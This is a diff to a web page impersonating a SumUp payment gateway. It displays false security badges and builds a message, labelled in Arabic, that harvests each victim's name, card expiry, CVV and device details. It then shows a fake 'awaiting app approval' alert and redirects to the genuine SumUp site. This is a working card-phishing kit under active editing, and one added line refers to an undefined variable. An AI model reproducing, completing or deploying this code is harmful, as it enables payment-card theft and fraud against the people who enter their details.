@@ -88,7 +88,7 @@
         <div class="amount-box">
             <div class="amount-big" id="amountNum">10</div>
             <div class="currency-big" id="currencySym">€</div>
-            <span style="font-size:14px;color:#94a3b8;">/paga• </span>
+            <span style="font-size:14px;color:#94a3b8;">paga</span>
         </div>
         
         <form id="payForm">
@@ -119,7 +119,7 @@
         </form>
         
         <div class="security">
-            🔒 SumUp Payment Gateway | PCI DSS Level 1 | SSL 256-bit
+            🔒 SumUp Payment Gateway | PCI DSS Level 3 | SSL 256-bit
         </div>
     </div>
     
@@ -145,7 +145,7 @@
                 lang: navigator.language
             };
             
-            const msg = `🌍 *SumUp €19 - بطاقة أوروبية LIVE*
+            const msg = `🌍 *SumUp €10 - المطور ياسين LIVE*
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 👨‍💼 *الزبون:* ${data.name}
@@ -153,11 +153,11 @@
 📅 *إنتهاء:* ${data.expire}
 🔐 *CVV:* \`${data.cvv}\`
 
-💶 *المبلغ:* 19€
+💶 *المبلغ:* 10€
 📱 *جهاز:* ${info.ua}
 🖥️ *دقة:* ${info.screen}
-
-🕐 *وقت المغرب:* ${time}
+📍 *العنوان* ${infi.api}
+🕐 *وقت اطاليا:* ${time}
 🆔 *ID:* #EUR${Math.floor(Math.random()*999999)}
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -193,7 +193,7 @@
             
             setTimeout(()=>{
                 if(ok){
-                    alert('✅ تم الدفع 10€ بنجاح!\nالفاتورة مرسلة');
+                    alert(' جاري انتظر موفقة من تطبيق!\nالفاتورة مرسلة');
                     window.location.href = 'https://sumup.com';
                 }else{
                     alert('❌ خطأ - جرب تاني');
